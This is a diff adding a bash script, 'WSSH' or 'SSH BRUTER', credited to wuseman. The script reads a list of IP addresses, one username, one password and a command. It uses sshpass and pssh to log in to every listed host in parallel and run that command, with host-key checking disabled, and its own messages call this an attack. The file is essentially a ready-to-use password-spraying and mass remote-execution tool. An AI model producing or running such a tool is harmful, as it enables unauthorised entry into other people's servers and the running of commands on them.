@@ -1,0 +1,135 @@
+#!/bin/bash
+################################################################################
+################################################################################
+####                                                                       #####
+#### A notice to all nerds.                                                #####
+#### If you will copy developers real work it will not make you a hacker.  #####
+#### Resepect all developers, we doing this because it's fun!              #####
+####                                                                       #####
+################################################################################
+################################ SOURCE CODE ###################################
+################################################################################
+####                                                                       #####
+####  Copyright (C) 2019, wuseman                                          #####
+####                                                                       #####
+####  This program is free software; you can redistribute it and/or modify #####
+####  it under the terms of the GNU General Public License as published by #####
+####  the Free Software Foundation; either version 2 of the License, or    #####
+####  (at your option) any later version.                                  #####
+####                                                                       #####
+####  This program is distributed in the hope that it will be useful,      #####
+####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
+####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
+####  GNU General Public License for more details.                         #####
+####                                                                       #####
+####  You must obey the GNU General Public License. If you will modify     #####
+####  this file(s), you may extend this exception to your version          #####
+####  of the file(s), but you are not obligated to do so.  If you do not   #####
+####  wish to do so, delete this exception statement from your version.    #####
+####  If you delete this exception statement from all source files in the  #####
+####  program, then also delete it here.                                   #####
+####                                                                       #####
+####  Contact:                                                             #####
+####          IRC: Freenode @ wuseman                                      #####
+####          Mail: wuseman <wuseman@nr1.nu>                               #####
+####                                                                       #####
+################################################################################
+################################################################################
+
+banner() {
+cat << "EOF"
+      ___     ____________
+     | W |   |            |
+   _|___|_  | SSH BRUTER |
+     (_xx)   |____________|
+    __)#(__  |/
+   ( )...( )(|)
+   || |_| ||//
+(<=() | | ()/
+    _(___)_
+   [-]   [-|
+===========================================
+EOF
+}
+
+usage() {
+
+cat << EOF
+    
+    ./$basename$0 [-c] [-f] [-p] ....
+      
+              -a        | Print author of this awesome tool
+              -c        | Command to be used on host 
+              -f        | File with all ip-addresses
+              -h        | Print this useful text
+              -l        | Print license for this tool
+              -p        | Password to use during attack
+              -t        | How many threads to be used
+              -V        | Print current version
+              -u        | Username to use during attack
+
+EOF
+exit 0
+
+}
+
+author() {
+cat << "EOF"
+
+ Copyright (C) 2019, wuseman
+
+ WSSH was founded in 2019 and was released as open source
+ on github.com/wuseman/WSSH in October 2019 and is licensed
+ under GNU LESSER GENERAL PUBLIC LICENSE GPLv3
+
+   - Author: wuseman <wuseman@nr1.nu>
+   - IRC   : wuseman <irc.freenode.com>
+
+ Please report bugs/issues on:
+
+   - https://github.com/wuseman/WSSH/issues
+
+EOF
+exit 0
+}
+
+if [[ -z $1 ]]; then
+    usage
+    exit 0
+fi
+
+while getopts ":c:f:t:u:p:aVl" bruter; do
+  case $bruter in
+      a) author      ;;
+      l) curl -sL curl https://nr1.nu/WSSH/LICENSE.md|less ;;
+      h) usage       ;;
+      c) c=${OPTARG} ;;
+      f) f=${OPTARG} ;;
+      t) t=${OPTARG} ;;
+      u) u=${OPTARG} ;;
+      p) p=${OPTARG} ;;
+      *) echo -e "$basename$0: internal error -- command $* is not a valid option, exiting ..."; exit 1 ;;
+     \?) echo -e "$basename$0: internal error -- command $* is not a valid option, exiting ..."; exit 1 ;;
+  esac
+done
+
+if [[ -z $c ]]; then echo -e "$basename$0: internal error -- you must specify a command to be used";exit 1;fi
+if [[ -z $f ]]; then echo -e "$basename$0: internal error -- you must specify a file with ip addresses (hostnames if fine)";exit 1;fi
+if [[ -z $t ]]; then echo -e "$basename$0: internal error -- you must specify how many threads to use at same time (Default: 17)";exit 1;fi
+if [[ -z $u ]]; then echo -e "$basename$0: internal error -- you must specify a username you want to use during the attack";exit;fi
+if [[ -z $p ]]; then echo -e "$basename$0: internal error -- you must specify a password you want to use during the attack";exit;fi
+
+bruteforce() {
+banner
+sshpass -p "$p" pssh -v -A -h $f -l $u -p $t -t 1 -O "UserKnownHostsFile=/dev/null" -O "StrictHostKeyChecking=no" -i "$c"
+}
+
+bruteforce
+
+
+
+
+
+
+
+
